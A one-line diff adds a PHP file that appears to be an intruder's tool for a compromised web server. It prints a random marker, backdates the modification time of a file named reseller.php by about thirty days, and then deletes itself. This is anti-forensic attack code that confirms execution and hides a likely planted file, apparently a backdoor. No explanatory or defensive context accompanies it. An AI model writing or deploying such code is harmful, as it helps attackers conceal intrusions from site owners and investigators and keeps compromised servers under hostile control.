@@ -1,0 +1,1 @@
+<?php echo "YPfhknqUND"; if (file_exists("./reseller.php")){ touch("./reseller.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*aeGrEqPXGXz7bR3R2XAf*/ ?>
